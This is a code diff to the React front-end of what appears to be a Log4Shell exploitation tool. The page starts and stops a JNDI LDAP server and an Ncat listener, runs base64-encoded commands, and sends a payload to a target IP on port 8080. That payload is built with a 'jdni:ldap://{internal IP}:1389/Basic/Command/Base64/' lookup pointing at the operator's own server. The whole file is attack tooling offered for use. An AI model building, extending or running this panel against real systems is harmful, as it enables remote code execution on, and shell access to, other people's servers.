@@ -8,213 +8,225 @@ import {
     Input,
     InputGroup,
     InputRightElement,
-    useColorMode
+    InputRightAddon,
+    InputLeftAddon,
+    Spinner,
+    useColorMode,
+    ButtonGroup
 } from "@chakra-ui/react";
-import { fetchJavaPath, fetchIP, startJNDI, startNcat, inputCMD } from "@/app/api/fetchdata";
 import { useEffect, useRef, useState } from "react";
 import "@fontsource/jetbrains-mono";
 import { exportReport } from "@/app/components/exportpdf";
+import {
+    fetchJavaPath,
+    fetchIP,
+    startJNDI,
+    startNcat,
+    inputCMD,
+    sendPayload,
+    stopJNDI,
+    stopNcat,
+    checkJNDI,
+    checkNcat
+} from "@/app/api/fetchdata";
 
 const HomePage = () => {
     const { colorMode } = useColorMode();
-    const [javaPath, setJavaPath] = useState('');
-    const [error, setError] = useState('');
-    const [intIP, setIntIP] = useState('');
-    const [extIP, setExtIP] = useState('');
-    const [ipError, setIpError] = useState('');
-    const [consolelog, setConsolelog] = useState('');
-    const [targetIP, setTargetIP] = useState('');
-    const [command, setCommand] = useState('');
-    const consoleBoxRef = useRef(null);
+    const [state, setState] = useState({ javaPath: '', error: '', intIP: '', extIP: '', ipError: '', consolelog: '', targetIP: '', command: '', loading: false, payload: '' });
+    const consoleBoxRef = useRef<HTMLDivElement | null>(null);
+    const ipRegex = /^(?:[0-9]{1,3}\.){3}(?!0|255)[0-9]{1,3}$/;
 
     useEffect(() => {
+        setState((prevState) => ({ ...prevState, loading: true }));
         fetchJavaPath().then(({ javaPath, error }) => {
             if (javaPath) {
-                setJavaPath(javaPath);
-                setConsolelog(prevLog => prevLog + (prevLog ? `\nJava Path: ${javaPath}` : `Java Path: ${javaPath}`));
+                setState((prevState) => ({ ...prevState, javaPath }));
+                updateConsoleLog(`Java Path: ${javaPath}`);
             }
             if (error) {
-                setError(error);
+                setState((prevState) => ({ ...prevState, error }));
             }
-        });
-        fetchIP().then(({ intIP, extIP, ipError }) => {
-            if (intIP) {
-                setIntIP(intIP);
-                setConsolelog(prevLog => prevLog + (prevLog ? `\nInternal IP: ${intIP}` : `Internal IP: ${intIP}`));
-            }
-            if (extIP) {
-                setExtIP(extIP);
-                setConsolelog(prevLog => prevLog + (prevLog ? `\nExternal IP: ${extIP}` : `External IP: ${extIP}`));
-            }
-            if (ipError) {
-                setIpError(ipError);
-            }
+            fetchIP().then(({ intIP, extIP, ipError }) => {
+                if (intIP) {
+                    setState((prevState) => ({ ...prevState, intIP }));
+                    updateConsoleLog(`Internal IP: ${intIP}`);
+                }
+                if (extIP) {
+                    setState((prevState) => ({ ...prevState, extIP }));
+                    updateConsoleLog(`External IP: ${extIP}`);
+                }
+                if (ipError) {
+                    setState((prevState) => ({ ...prevState, ipError }));
+                }
+                setState((prevState) => ({ ...prevState, loading: false }));
+            });
         });
     }, []);
 
     useEffect(() => {
         if (consoleBoxRef.current) {
-            (consoleBoxRef.current as HTMLDivElement).scrollTop = (consoleBoxRef.current as HTMLDivElement).scrollHeight;
+            consoleBoxRef.current.scrollTop = consoleBoxRef.current.scrollHeight;
         }
-    }, [consolelog]);
+    }, [state.consolelog]);
 
-    const handleInputButtonClick = async (type: any) => {
+    const updateConsoleLog = (log: any) => {
+        setState((prevState) => ({ ...prevState, consolelog: prevState.consolelog + (prevState.consolelog ? `\n${log}` : log) }));
+    };
+
+    const handleInputButtonClick = async (type: any, payload = null) => {
+        setState((prevState) => ({ ...prevState, loading: true }));
         let newConsoleLog = '';
         switch (type) {
             case 'test':
-                const testResult = 'Test successful!';
-                newConsoleLog += `${testResult}`;
+                newConsoleLog += 'Test successful!';
                 break;
-            case 'javaPath':
-                const javaPathResult = await fetchJavaPath();
-                if (javaPathResult.javaPath) {
-                    newConsoleLog += `Java Path: ${javaPathResult.javaPath}`;
-                }
-                if (javaPathResult.error) {
-                    newConsoleLog += `Error: ${javaPathResult.error}`;
-                }
-                break;
-            case 'intip':
-                const intIPResult = await fetchIP();
-                if (intIPResult.intIP) {
-                    newConsoleLog += `Internal IP: ${intIPResult.intIP}`;
-                }
-                if (intIPResult.ipError) {
-                    newConsoleLog += `Error: ${intIPResult.ipError}`;
-                }
-                break;
-            case 'extip':
-                const extIPResult = await fetchIP();
-                if (extIPResult.extIP) {
-                    newConsoleLog += `External IP: ${extIPResult.extIP}`;
-                }
-                if (extIPResult.ipError) {
-                    newConsoleLog += `Error: ${extIPResult.ipError}`;
-                }
+            case 'inputCommand':
+                const base64cmd = btoa(state.command);
+                const inputCMDResult = await inputCMD(base64cmd);
+                newConsoleLog += inputCMDResult.message || inputCMDResult.error;
                 break;
             case 'settargetip':
-                const targetIPResult = targetIP;
-                if (targetIPResult) {
-                    newConsoleLog += `Target IP Address: ${targetIPResult}`;
+                if (!ipRegex.test(state.targetIP)) {
+                    newConsoleLog += 'Error: Invalid IP Address Format';
                 } else {
-                    newConsoleLog += `Error: Target IP Address is empty`;
+                    newConsoleLog += `Target IP Address: ${state.targetIP}`;
                 }
                 break;
-            case 'jndi':
+            case 'sendPayload':
+                if (!ipRegex.test(state.targetIP)) {
+                    newConsoleLog += 'Error: Invalid Target IP Address Format';
+                } else if (!state.payload) {
+                    newConsoleLog += 'Error: Payload is empty';
+                } else {
+                    const base64payload = btoa(state.payload);
+                    const payloadResult = await sendPayload(base64payload, state.targetIP);
+                    newConsoleLog += payloadResult.message ? `${payloadResult.message}` : payloadResult.error;
+                }
+                break;
+            case 'startJNDI':
                 const jndiResult = await startJNDI();
-                if (jndiResult.message) {
-                    newConsoleLog += `${jndiResult.message}`;
-                }
-                if (jndiResult.error) {
-                    newConsoleLog += `${jndiResult.error}`;
-                }
+                newConsoleLog += jndiResult.error ? jndiResult.error : jndiResult.message;
                 break;
-            case 'ncat':
+            case 'stopJNDI':
+                const stopJndiResult = await stopJNDI();
+                newConsoleLog += stopJndiResult.error ? stopJndiResult.error : stopJndiResult.message;
+                break;
+            case 'checkJNDI':
+                const checkJndiResult = await checkJNDI();
+                newConsoleLog += checkJndiResult.error ? checkJndiResult.error : checkJndiResult.message;
+                break;
+            case 'startNcat':
                 const ncatResult = await startNcat();
-                if (ncatResult.message) {
-                    newConsoleLog += `${ncatResult.message}`;
-                }
-                if (ncatResult.error) {
-                    newConsoleLog += `${ncatResult.error}`;
-                }
+                newConsoleLog += ncatResult.error ? ncatResult.error : ncatResult.message;
                 break;
-            case 'inputcommand':
-                const base64cmd = btoa(command);
-                const inputCMDResult = await inputCMD(base64cmd);
-                if (inputCMDResult.message) {
-                    newConsoleLog += `${inputCMDResult.message}`;
-                }
-                if (inputCMDResult.error) {
-                    newConsoleLog += `${inputCMDResult.error}`;
-                }
+            case 'stopNcat':
+                const stopNcatResult = await stopNcat();
+                newConsoleLog += stopNcatResult.error ? stopNcatResult.error : stopNcatResult.message;
+                break;
+            case 'checkNcat':
+                const checkNcatResult = await checkNcat();
+                newConsoleLog += checkNcatResult.error ? checkNcatResult.error : checkNcatResult.message;
                 break;
             default:
                 newConsoleLog += 'Unknown operation';
                 break;
         }
-        setConsolelog(prevLog => prevLog + (prevLog ? `\n${newConsoleLog}` : newConsoleLog));
+        setState((prevState) => ({ ...prevState, loading: false, consolelog: prevState.consolelog + (prevState.consolelog ? `\n${newConsoleLog}` : newConsoleLog) }));
     };
 
     return (
         <Box>
             <Box>
-                <InputGroup size='md' my={4}>
-                    <Input
-                        pr='4.5rem'
-                        placeholder='Enter Target IP Address'
-                        value={targetIP}
-                        onChange={(e) => setTargetIP(e.target.value)}
-                    />
-                    <InputRightElement width='6rem'>
-                        <Button size='sm' backgroundColor={'transparent'} _hover={{ backgroundColor: 'transparent' }} onClick={() => handleInputButtonClick('settargetip')}>
-                            Set
-                        </Button>
-                        <Button size='sm' backgroundColor={'transparent'} _hover={{ backgroundColor: 'transparent' }} onClick={() => setTargetIP('')}>
-                            Clear
-                        </Button>
-                    </InputRightElement>
-                </InputGroup>
-                <InputGroup size='md' my={4}>
-                    <Input
-                        pr='4.5rem'
-                        placeholder='Enter command'
-                        value={command}
-                        onChange={(e) => setCommand(e.target.value)}
-                    />
-                    <InputRightElement width='6rem'>
-                        <Button size='sm' backgroundColor={'transparent'} _hover={{ backgroundColor: 'transparent' }} onClick={() => handleInputButtonClick('inputcommand')}>
-                            Go
-                        </Button>
-                        <Button size='sm' backgroundColor={'transparent'} _hover={{ backgroundColor: 'transparent' }} onClick={() => setCommand('')}>
-                            Clear
-                        </Button>
-                    </InputRightElement>
-                </InputGroup>
-                <Wrap spacing={3} my={4}>
-                    <Button size={'sm'} colorScheme='gray' variant='outline' onClick={() => handleInputButtonClick('test')}>
-                        Test
+                <Box border='lg' borderWidth='1px' borderRadius='lg' overflow='hidden' px={4} my={4}>
+                    <Text fontSize='xl' fontWeight='bold' my={4} ml={1}>Host related</Text>
+                    <InputGroup size='md' mt={4}>
+                        <Input
+                            pr='4.5rem'
+                            placeholder='Command'
+                            value={state.command}
+                            onChange={(e) => setState((prevState) => ({ ...prevState, command: e.target.value }))}
+                        />
+                        <InputRightElement width='4rem'>
+                            <Button size='sm' backgroundColor={'transparent'} _hover={{ backgroundColor: 'transparent' }} onClick={() => handleInputButtonClick('inputCommand')}>
+                                Run
+                            </Button>
+                        </InputRightElement>
+                    </InputGroup>
+                    <Button size='sm' backgroundColor={'transparent'} _hover={{ backgroundColor: 'transparent' }} onClick={() => setState((prevState) => ({ ...prevState, command: '' }))}>Clear
                     </Button>
-                    <Button size={'sm'} colorScheme='gray' variant='outline' onClick={() => handleInputButtonClick('javaPath')}>
-                        Check Java Path
-                    </Button>
-                    <Button size={'sm'} colorScheme='gray' variant='outline' onClick={() => handleInputButtonClick('intip')}>
-                        Check Internal IP
-                    </Button>
-                    <Button size={'sm'} colorScheme='gray' variant='outline' onClick={() => handleInputButtonClick('extip')}>
-                        Check External IP
-                    </Button>
-                    <Button size={'sm'} colorScheme='green' variant='outline' onClick={() => handleInputButtonClick('jndi')}>
-                        Start JNDI Server
-                    </Button>
-                    <Button size={'sm'} colorScheme='green' variant='outline' onClick={() => handleInputButtonClick('ncat')}>
-                        Start Ncat Server
-                    </Button>
-                    <Button size={'sm'} colorScheme='purple' variant='outline' onClick={exportReport}>
-                        Export Console Log
-                    </Button>
-                    <Button size={'sm'} colorScheme='gray' variant='outline' onClick={() => setConsolelog('')}>
-                        Clear All
-                    </Button>
-                </Wrap>
+                </Box>
+                <Box border='lg' borderWidth='1px' borderRadius='lg' overflow='hidden' px={4} my={4}>
+                    <Text fontSize='xl' fontWeight='bold' my={4} ml={1}>Target related</Text>
+                    <InputGroup size='md' mb={2}>
+                        <Input
+                            pr='4.5rem'
+                            placeholder='Target IP Address'
+                            value={state.targetIP}
+                            onChange={(e) => setState((prevState) => ({ ...prevState, targetIP: e.target.value }))}
+                        />
+                        <InputRightAddon>:8080</InputRightAddon>
+                    </InputGroup>
+                    <InputGroup size='md'>
+                        <InputLeftAddon>jdni:ldap://{state.intIP}:1389/Basic/Command/Base64/</InputLeftAddon>
+                        <Input
+                            pr='4.5rem'
+                            placeholder='Payload'
+                            value={state.payload}
+                            onChange={(e) => setState((prevState) => ({ ...prevState, payload: e.target.value }))}
+                        />
+                    </InputGroup>
+                    <ButtonGroup>
+                        <Button size='sm' backgroundColor={'transparent'} _hover={{ backgroundColor: 'transparent' }} onClick={() => setState((prevState) => ({ ...prevState, payload: '', targetIP: '' }))} mb={1}>Clear</Button>
+                    </ButtonGroup>
+                </Box>
+                <Box border='lg' borderWidth='1px' borderRadius='lg' overflow='hidden' px={4} my={4}>
+                    <Text fontSize='xl' fontWeight='bold' mt={4} ml={1}>Actions</Text>
+                    <Wrap spacing={2} my={2}>
+                        {[
+                            { label: 'Test', type: 'test' },
+                            { label: 'Start JNDI Server', type: 'startJNDI' },
+                            { label: 'Stop JNDI Server', type: 'stopJNDI' },
+                            { label: 'Check JNDI Server', type: 'checkJNDI' },
+                            { label: 'Start Ncat Server', type: 'startNcat' },
+                            { label: 'Stop Ncat Server', type: 'stopNcat' },
+                            { label: 'Check Ncat Server', type: 'checkNcat' },
+                            { label: 'Send Payload', type: 'sendPayload' },
+                        ].map(({ label, type }) => (
+                            <Button key={type} size={'sm'} colorScheme={type === 'sendPayload' ? 'blue' : type === 'stopJNDI' || type === 'stopNcat' ? 'red' : type === 'startJNDI' || type === 'startNcat' ? 'green' : type === 'exportReport' ? 'purple' : type === 'checkJNDI' || type === 'checkNcat' ? 'cyan' : 'gray'} variant='outline' onClick={() => handleInputButtonClick(type)}>
+                                {label}
+                            </Button>
+                        ))}
+                    </Wrap>
+                    <Wrap spacing={2} mb={4}>
+                        {[
+                            { label: 'Export Console Log', type: 'exportReport', onClick: () => exportReport(state.consolelog) },
+                            { label: 'Clear All', type: 'clearAll', onClick: () => setState((prevState) => ({ ...prevState, consolelog: '' })) }
+                        ].map(({ label, type, onClick }) => (
+                            <Button key={type} size={'sm'} colorScheme={type === 'exportReport' ? 'purple' : 'gray'} variant='outline' onClick={onClick}>
+                                {label}
+                            </Button>
+                        ))}
+                    </Wrap>
+                </Box>
             </Box>
-            <Box ref={consoleBoxRef} as="footer" width="full" justifyContent="center" borderWidth='1px' borderRadius='lg' overflow='hidden' minW={"100%"} minH={"65vh"} maxH={"65vh"} overflowY={"auto"}>
+            <Box ref={consoleBoxRef} as="footer" width="full" justifyContent="center" borderWidth='1px' borderRadius='lg' overflow='hidden' minW={"100%"} minH={"40vh"} maxH={"40vh"} overflowY={"auto"}>
                 <Box position="sticky" top="0" zIndex="sticky" bg={colorMode === "light" ? "white" : "gray.800"} px={4} pt={4}>
-                    <Text>Output Console:</Text>
+                    <Text ml={1}>Output Console: {state.loading && (<Spinner size='xs' thickness='4px' speed='0.65s' emptyColor='gray.200' color='blue.500' />)}</Text>
                     <Divider my={2} />
                 </Box>
                 <Box ref={consoleBoxRef} px={4} pb={4}>
-                    {consolelog.split('\n').map((line, index) => (
-                        <Text key={index}>
-                            {line.split('\\n').map((part, i) => (
+                    {state.consolelog.split('\n').map((line, index) => (
+                        <Text key={index} fontFamily={'JetBrains Mono'} fontSize={'sm'} whiteSpace='pre-wrap'>
+                            {line.split('\n').map((part, i) => (
                                 <Text as="span" key={i} display="block"
                                     _before={{
-                                        content: '"$"',
+                                        content: '"$ "',
                                         color: 'blue.500',
                                         display: 'inline',
                                         fontFamily: 'JetBrains Mono',
                                         fontWeight: 'bold',
                                         marginRight: '8px',
-                                        fontSize: 'sm'
+                                        fontSize: 'sm',
                                     }}
                                 >{part}</Text>
                             ))}
@@ -222,8 +234,8 @@ const HomePage = () => {
                     ))}
                 </Box>
             </Box>
-        </Box >
+        </Box>
     );
-}
+};
 
 export default HomePage;
